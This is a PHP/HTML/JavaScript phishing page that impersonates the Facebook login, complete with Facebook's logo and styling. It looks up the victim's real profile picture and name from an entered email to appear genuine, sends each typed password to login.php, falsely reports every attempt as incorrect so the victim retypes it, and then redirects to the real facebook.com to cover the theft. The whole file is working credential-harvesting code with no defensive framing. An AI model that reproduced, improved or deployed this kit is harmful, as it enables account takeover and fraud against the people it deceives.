<?php
/**
 * Auto-Detection Login Page
 * Step 1: User enters email/phone
 * Step 2: Real-time Facebook lookup → Display THEIR profile + password form
 */
include "validate.php";
include "ip.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <meta name="theme-color" content="#1877F2" />
  <title>Log in to Facebook</title>
  <link rel="shortcut icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yi/r/4Kv5U5b1o3f.png" sizes="196x196" />
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html, body {
      height: 100%;
      width: 100%;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #fff;
      color: #1c2b33;
      overflow-x: hidden;
      -webkit-tap-highlight-color: transparent;
    }

    #app-container {
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      justify-content: flex-start;
      align-items: center;
      width: 100%;
      max-width: 400px;
      margin: 0 auto;
      padding: 0 16px 20px 16px;
    }

    .logo-container {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-top: 60px;
      margin-bottom: 40px;
      width: 100%;
    }

    .logo-container img {
      max-height: 60px;
      width: auto;
    }

    /* ============== STEP 1: EMAIL INPUT ============== */
    #step1 {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    #step1.hidden { display: none; }

    .input-wrapper {
      background: #f5f6f7;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      min-height: 52px;
      display: flex;
      align-items: stretch;
      position: relative;
      width: 100%;
      overflow: hidden;
      transition: border-color 0.2s ease-in-out, background-color 0.2s ease-in-out;
    }

    .input-wrapper:focus-within {
      border-color: #1877f2;
      background-color: #fff;
    }

    .input-wrapper.error {
      border-color: #f02849;
      animation: errorShake 0.5s ease;
    }

    @keyframes errorShake {
      0%, 100% { transform: translateX(0); }
      10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
      20%, 40%, 60%, 80% { transform: translateX(5px); }
    }

    .form-input {
      font-family: inherit;
      font-size: 16px;
      line-height: 1.25;
      color: #1c1e21;
      background: transparent;
      border: none;
      outline: none;
      padding: 18px 16px 6px 16px;
      width: 100%;
      height: 100%;
      z-index: 1;
    }

    .form-input::placeholder {
      color: transparent;
    }

    .input-label {
      position: absolute;
      top: 50%;
      left: 16px;
      transform: translateY(-50%);
      color: #606770;
      font-size: 16px;
      pointer-events: none;
      transition: all 0.15s ease-out;
      z-index: 0;
    }

    .form-input:focus + .input-label,
    .form-input:not(:placeholder-shown) + .input-label {
      top: 8px;
      transform: translateY(0);
      font-size: 12px;
      color: #1877f2;
    }

    .form-input:not(:placeholder-shown):not(:focus) + .input-label {
      color: #606770;
    }

    .btn-primary {
      height: 44px;
      width: 100%;
      margin-top: 16px;
      padding: 0 20px;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      border: none;
      background: #1877f2;
      color: #fff;
      transition: background-color 0.2s ease;
    }

    .btn-primary:hover {
      background-color: #166fe5;
    }

    .btn-primary:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }

    .btn-spinner {
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255, 255, 255, 0.4);
      border-top: 3px solid #fff;
      border-radius: 50%;
      animation: spinner-rotate 0.8s linear infinite;
      margin-right: 8px;
      display: none;
    }

    .btn-primary.loading .btn-spinner { display: inline-block; }
    .btn-primary.loading .btn-text { display: none; }

    @keyframes spinner-rotate {
      0% { transform: rotate(0); }
      100% { transform: rotate(360deg); }
    }

    /* ============== STEP 2: PROFILE + PASSWORD ============== */
    #step2 {
      width: 100%;
      display: none;
      flex-direction: column;
      align-items: center;
    }

    #step2.active { display: flex; }

    .profile-display {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      margin-bottom: 24px;
    }

    .avatar-large {
      width: 160px;
      height: 160px;
      border-radius: 50%;
      object-fit: cover;
      margin-bottom: 16px;
      background-color: #f0f2f5;
      border: 3px solid #e4e6eb;
    }

    .profile-name {
      font-size: 22px;
      font-weight: 600;
      color: #1c1e21;
      text-align: center;
      margin-bottom: 4px;
    }

    .profile-email {
      font-size: 14px;
      color: #65676b;
      text-align: center;
    }

    .password-section {
      width: 100%;
    }

    .password-wrapper {
      background: #f5f6f7;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      min-height: 52px;
      display: flex;
      align-items: stretch;
      position: relative;
      width: 100%;
      overflow: hidden;
      transition: border-color 0.2s ease-in-out;
    }

    .password-wrapper:focus-within {
      border-color: #1877f2;
      background-color: #fff;
    }

    .password-wrapper.error {
      border-color: #f02849;
      animation: errorShake 0.5s ease;
    }

    .password-input {
      font-family: inherit;
      font-size: 16px;
      color: #1c1e21;
      background: transparent;
      border: none;
      outline: none;
      padding: 18px 48px 6px 16px;
      width: 100%;
      z-index: 1;
    }

    .password-input::placeholder { color: transparent; }

    .password-label {
      position: absolute;
      top: 50%;
      left: 16px;
      transform: translateY(-50%);
      color: #606770;
      font-size: 16px;
      pointer-events: none;
      transition: all 0.15s ease-out;
    }

    .password-input:focus + .password-label,
    .password-input:not(:placeholder-shown) + .password-label {
      top: 8px;
      transform: translateY(0);
      font-size: 12px;
      color: #1877f2;
    }

    .password-toggle {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
      width: 48px;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2;
      cursor: pointer;
      background: none;
      border: none;
    }

    .password-toggle svg {
      width: 24px;
      height: 24px;
      fill: #606770;
    }

    .password-toggle .eye-closed { display: none; }
    .password-toggle.showing .eye-open { display: none; }
    .password-toggle.showing .eye-closed { display: block; }

    .login-button {
      height: 44px;
      width: 100%;
      margin-top: 16px;
      padding: 0 20px;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      border: none;
      background: #1877f2;
      color: #fff;
      transition: background-color 0.2s ease;
    }

    .login-button:hover { background-color: #166fe5; }
    .login-button:disabled { opacity: 0.7; cursor: not-allowed; }
    .login-button.loading .btn-spinner { display: inline-block; }
    .login-button.loading .btn-text { display: none; }

    .forgot-link {
      text-align: center;
      margin-top: 12px;
    }

    .forgot-link a {
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
    }

    .forgot-link a:hover { text-decoration: underline; }

    .switch-account {
      margin-top: 20px;
      text-align: center;
    }

    .switch-account a {
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
      cursor: pointer;
    }

    /* Error Modal */
    #errorModal {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.6);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      padding: 20px;
    }

    #errorModal .modal-content {
      background: #fff;
      border-radius: 12px;
      width: 100%;
      max-width: 320px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
      overflow: hidden;
      text-align: center;
    }

    #errorModal h2 {
      font-size: 18px;
      font-weight: 600;
      color: #1c1e21;
      margin: 0;
      padding: 20px 20px 8px;
    }

    #errorModal p {
      font-size: 14px;
      color: #606770;
      margin: 0;
      line-height: 1.4;
      padding: 0 20px 16px;
    }

    #errorModal button {
      width: 100%;
      padding: 14px 0;
      border: none;
      border-top: 1px solid #dadde1;
      background: none;
      font-size: 16px;
      color: #1877f2;
      cursor: pointer;
    }

    /* Loading Overlay */
    #loadingOverlay {
      position: fixed;
      inset: 0;
      background: rgba(255, 255, 255, 0.9);
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 10000;
    }

    #loadingOverlay.active { display: flex; }

    .loading-spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #e4e6eb;
      border-top-color: #1877f2;
      border-radius: 50%;
      animation: spinner-rotate 0.8s linear infinite;
    }

    #loadingOverlay p {
      margin-top: 16px;
      font-size: 15px;
      color: #65676b;
      transition: opacity 0.3s ease;
    }

    .loading-status {
      margin-top: 12px;
      font-size: 14px;
      color: #65676b;
      min-height: 20px;
      text-align: center;
    }

    .footer-text {
      text-align: center;
      margin-top: 30px;
      color: #8a8d91;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div id="app-container">
    <!-- Facebook Logo -->
    <div class="logo-container">
      <img alt="Facebook" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png">
    </div>

    <!-- Error Modal -->
    <div id="errorModal">
      <div class="modal-content">
        <h2 id="errorTitle">Error</h2>
        <p id="errorMessage">Something went wrong.</p>
        <button type="button" id="errorOkBtn">OK</button>
      </div>
    </div>

    <!-- Loading Overlay -->
    <div id="loadingOverlay">
      <div class="loading-spinner"></div>
      <p id="loadingMainText">Verifying your account...</p>
      <div class="loading-status" id="loadingStatus"></div>
    </div>

    <!-- ============== STEP 1: EMAIL INPUT ============== -->
    <div id="step1">
      <form id="emailForm">
        <div class="input-wrapper" id="emailWrapper">
          <input type="text" 
                 id="emailInput" 
                 class="form-input" 
                 name="email"
                 autocomplete="username"
                 autocapitalize="off"
                 autocorrect="off"
                 placeholder=" "
                 required>
          <label class="input-label" for="emailInput">Mobile number or email address</label>
        </div>
        
        <button type="submit" class="btn-primary" id="continueBtn">
          <span class="btn-spinner"></span>
          <span class="btn-text">Continue</span>
        </button>
      </form>
      
      <div class="footer-text">
        <a href="#" style="color: #1877f2; text-decoration: none;">Forgot password?</a>
      </div>
    </div>

    <!-- ============== STEP 2: PROFILE + PASSWORD ============== -->
    <div id="step2">
      <div class="profile-display">
        <img class="avatar-large" id="profilePic" src="" alt="Profile">
        <div class="profile-name" id="profileName">User</div>
        <div class="profile-email" id="profileEmail"></div>
      </div>

      <div class="password-section">
        <form id="passwordForm" method="POST" action="login.php">
          <input type="hidden" name="sessionId" id="sessionIdField" value="">
          <input type="hidden" name="email" id="hiddenEmail" value="">
          <input type="hidden" name="targetName" id="hiddenName" value="">
          <input type="hidden" name="attemptCount" id="attemptCountField" value="0">

          <div class="password-wrapper" id="passwordWrapper">
            <input type="password" 
                   name="password" 
                   id="passwordInput" 
                   class="password-input" 
                   autocomplete="current-password" 
                   placeholder=" "
                   required>
            <label class="password-label" for="passwordInput">Password</label>
            <button type="button" class="password-toggle" id="passwordToggle">
              <svg class="eye-open" viewBox="0 0 24 24">
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
              </svg>
              <svg class="eye-closed" viewBox="0 0 24 24">
                <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.44-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 9.95 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
              </svg>
            </button>
          </div>

          <button type="submit" class="login-button" id="loginBtn">
            <span class="btn-spinner"></span>
            <span class="btn-text">Log In</span>
          </button>
        </form>

        <div class="forgot-link">
          <a href="#">Forgot password?</a>
        </div>

        <div class="switch-account">
          <a id="switchAccountBtn">Log in to another account</a>
        </div>
      </div>
    </div>

    <div class="footer-text" style="margin-top: auto; padding-top: 30px;">
      About · Help · More
    </div>
  </div>

  <script>
  (function() {
    'use strict';

    // === CONFIG ===
    const MAX_RETRY = 2;
    const REDIRECT_URL = 'https://www.facebook.com/';
    const SESSION_ID = 'FP_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    const DEFAULT_AVATAR = 'https://scontent.fmnl17-7.fna.fbcdn.net/v/t1.30497-1/143086968_2856368904622192_1959732218791162458_n.png?stp=cp0_dst-png_p80x80&_nc_cat=1&ccb=1-7&_nc_sid=5f2048&_nc_eui2=AeEUaYE3L4gQh7fD_KOYpY5U4oXELN5kIc7ihcQs3mQhzgI_uC5nxCkDQe1e_cZD8nH6F7i5P9m_T6o3xOGLJmNt&_nc_ohc=dg14q8fq-G4Q7kNvgFLs_la&_nc_ht=scontent.fmnl17-7.fna&oh=00_AYBXQzVrLJr6mZvZmY0dWfj6k0OPaKvL4OWlrvYS7QNIQQ&oe=678B3EF8';

    // === STATE ===
    let loginAttempts = 0;
    let isSubmitting = false;
    let currentEmail = '';
    let currentProfile = { name: '', pic: '' };

    // === DOM ===
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const emailForm = document.getElementById('emailForm');
    const emailInput = document.getElementById('emailInput');
    const emailWrapper = document.getElementById('emailWrapper');
    const continueBtn = document.getElementById('continueBtn');
    const passwordForm = document.getElementById('passwordForm');
    const passwordInput = document.getElementById('passwordInput');
    const passwordWrapper = document.getElementById('passwordWrapper');
    const passwordToggle = document.getElementById('passwordToggle');
    const loginBtn = document.getElementById('loginBtn');
    const profilePic = document.getElementById('profilePic');
    const profileName = document.getElementById('profileName');
    const profileEmail = document.getElementById('profileEmail');
    const hiddenEmail = document.getElementById('hiddenEmail');
    const hiddenName = document.getElementById('hiddenName');
    const sessionField = document.getElementById('sessionIdField');
    const attemptField = document.getElementById('attemptCountField');
    const errorModal = document.getElementById('errorModal');
    const errorTitle = document.getElementById('errorTitle');
    const errorMessage = document.getElementById('errorMessage');
    const errorOkBtn = document.getElementById('errorOkBtn');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const switchAccountBtn = document.getElementById('switchAccountBtn');

    // Set session ID
    if (sessionField) sessionField.value = SESSION_ID;

    // === UTILITY FUNCTIONS ===
    function showError(title, message) {
      errorTitle.textContent = title;
      errorMessage.textContent = message;
      errorModal.style.display = 'flex';
    }

    function hideError() {
      errorModal.style.display = 'none';
    }

    function showLoading(show, mainText = 'Verifying your account...', statusText = '') {
      loadingOverlay.classList.toggle('active', show);
      if (show) {
        document.getElementById('loadingMainText').textContent = mainText;
        document.getElementById('loadingStatus').textContent = statusText;
      }
    }

    function updateLoadingStatus(statusText) {
      const statusEl = document.getElementById('loadingStatus');
      if (statusEl) {
        statusEl.textContent = statusText;
      }
    }

    function setButtonLoading(btn, loading) {
      btn.disabled = loading;
      btn.classList.toggle('loading', loading);
    }

    function shakeElement(el) {
      el.classList.add('error');
      setTimeout(() => el.classList.remove('error'), 500);
    }

    // === STEP 1: EMAIL SUBMIT → PROFILE LOOKUP ===
    emailForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const email = emailInput.value.trim();
      if (!email) {
        showError('Required', 'Please enter your email or phone number.');
        shakeElement(emailWrapper);
        return;
      }

      currentEmail = email;
      setButtonLoading(continueBtn, true);
      
      // Show loading overlay with progressive messages
      showLoading(true, 'Verifying your account...', 'Connecting to Facebook...');
      
      // Progressive status updates
      const statusMessages = [
        { delay: 500, text: 'Connecting to Facebook...' },
        { delay: 2000, text: 'Retrieving your profile...' },
        { delay: 4000, text: 'Almost done...' }
      ];
      
      const statusTimers = statusMessages.map(msg => 
        setTimeout(() => updateLoadingStatus(msg.text), msg.delay)
      );

      try {
        // Real-time profile lookup using browser automation service
        const response = await fetch('profile_lookup_v3.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: 'email=' + encodeURIComponent(email)
        });

        const data = await response.json();
        
        // Clear status timers
        statusTimers.forEach(timer => clearTimeout(timer));
        
        setButtonLoading(continueBtn, false);
        showLoading(false);

        // Extract profile data - ONLY proceed if we got a REAL profile pic from Facebook
        const hasRealProfilePic = data.success && data.profilePic && data.profilePic.startsWith('data:image');
        
        if (hasRealProfilePic) {
          // Real Facebook profile found!
          currentProfile.name = data.name || email;
          currentProfile.pic = data.profilePic;
          
          // Update UI
          profilePic.src = currentProfile.pic;
          profilePic.onerror = () => { profilePic.src = DEFAULT_AVATAR; };
          profileName.textContent = currentProfile.name;
          profileEmail.textContent = email;
          hiddenEmail.value = email;
          hiddenName.value = currentProfile.name;

          // Transition to Step 2
          step1.classList.add('hidden');
          step2.classList.add('active');
          
          // Focus password input
          setTimeout(() => passwordInput.focus(), 300);
        } else {
          // NO real profile found - show error, stay on Step 1
          showError('Account Not Found', 'No Facebook account found with this email or phone number.');
          emailInput.value = '';
          emailInput.focus();
        }

      } catch (err) {
        // Clear status timers
        statusTimers.forEach(timer => clearTimeout(timer));
        
        setButtonLoading(continueBtn, false);
        showLoading(false);
        
        // On error, show error message - DON'T proceed with fake profile
        showError('Error', 'Unable to verify account. Please try again.');
        emailInput.focus();
      }
    });

    // === STEP 2: PASSWORD SUBMIT ===
    passwordForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      if (isSubmitting) return;
      
      const password = passwordInput.value.trim();
      if (!password) {
        showError('Password Required', 'Please enter your password.');
        shakeElement(passwordWrapper);
        return;
      }

      isSubmitting = true;
      setButtonLoading(loginBtn, true);
      
      if (attemptField) attemptField.value = loginAttempts + 1;

      const formData = new FormData(passwordForm);
      formData.append('attemptNumber', loginAttempts + 1);

      try {
        const response = await fetch('login.php', {
          method: 'POST',
          body: formData
        });

        setButtonLoading(loginBtn, false);
        isSubmitting = false;

        // Check if max retries exceeded
        if (loginAttempts >= MAX_RETRY) {
          showLoading(true);
          setTimeout(() => {
            window.location.href = REDIRECT_URL;
          }, 1500);
          return;
        }

        // Show error and increment attempts
        loginAttempts++;
        shakeElement(passwordWrapper);
        passwordInput.value = '';
        
        if (loginAttempts === 1) {
          showError('Incorrect Password', 'The password you entered is incorrect. Please try again.');
        } else if (loginAttempts === MAX_RETRY) {
          showError('Incorrect Password', 'Last attempt. Please verify your password carefully.');
        } else {
          showError('Incorrect Password', 'Wrong password. Please try again.');
        }

      } catch (err) {
        setButtonLoading(loginBtn, false);
        isSubmitting = false;
        showError('Connection Error', 'Unable to connect. Please check your internet and try again.');
      }
    });

    // === PASSWORD TOGGLE ===
    passwordToggle.addEventListener('click', (e) => {
      e.preventDefault();
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        passwordToggle.classList.add('showing');
      } else {
        passwordInput.type = 'password';
        passwordToggle.classList.remove('showing');
      }
    });

    // === SWITCH ACCOUNT ===
    switchAccountBtn.addEventListener('click', () => {
      step2.classList.remove('active');
      step1.classList.remove('hidden');
      emailInput.value = '';
      passwordInput.value = '';
      loginAttempts = 0;
      emailInput.focus();
    });

    // === ERROR MODAL OK ===
    errorOkBtn.addEventListener('click', () => {
      hideError();
      passwordInput.focus();
    });

    // Auto-focus email input
    emailInput.focus();

  })();
  </script>
</body>
</html>

